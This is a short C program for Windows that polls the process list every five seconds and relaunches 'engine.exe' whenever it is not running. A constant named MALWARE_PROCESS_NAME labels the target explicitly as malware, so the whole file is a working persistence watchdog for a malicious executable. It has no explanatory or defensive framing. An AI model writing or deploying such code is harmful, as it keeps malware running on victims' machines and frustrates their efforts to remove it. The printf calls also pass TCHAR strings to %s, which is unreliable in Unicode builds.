#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include <psapi.h>

// Declare constants
#define PROCESS_ARRAY_SIZE 1024
#define PROCESS_NAME_UNKNOWN TEXT("<unknown>")
#define MALWARE_PROCESS_NAME TEXT("engine.exe")

// Function declarations
BOOL IsProcessRunning(const TCHAR* processName);
void LaunchProcess(const TCHAR* processName);
void CheckAndLaunchProcess(const TCHAR* processName);

// Main function
int main() {
    while (TRUE) {
        Sleep(5000); // Check every 5 seconds
        CheckAndLaunchProcess(MALWARE_PROCESS_NAME);
    }
    return 0; // Not reachable, present to comply with signature
}

// Function to check if a specific process is currently running
BOOL IsProcessRunning(const TCHAR* processName) {
    DWORD aProcesses[PROCESS_ARRAY_SIZE], cbNeeded, cProcesses;

    if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded)) {
        return FALSE;
    }

    cProcesses = cbNeeded / sizeof(DWORD);

    for (unsigned int i = 0; i < cProcesses; i++) {
        if (aProcesses[i] != 0) {
            TCHAR szProcessName[MAX_PATH] = PROCESS_NAME_UNKNOWN;
            HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, aProcesses[i]);

            if (hProcess != NULL) {
                HMODULE hMod;
                if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded)) {
                    GetModuleBaseName(hProcess, hMod, szProcessName, sizeof(szProcessName) / sizeof(TCHAR));
                }
                CloseHandle(hProcess);
            }

            if (_tcsicmp(szProcessName, processName) == 0) {
                return TRUE;
            }
        }
    }

    return FALSE;
}

// Function to launch a specified process
void LaunchProcess(const TCHAR* processName) {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    if (!CreateProcess(processName, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        printf("CreateProcess failed (%d).\n", GetLastError());
    } else {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

// Function to check and launch a process if not running
void CheckAndLaunchProcess(const TCHAR* processName) {
    if (!IsProcessRunning(processName)) {
        printf("%s is not running. Starting %s...\n", processName, processName);
        LaunchProcess(processName);
    }
}
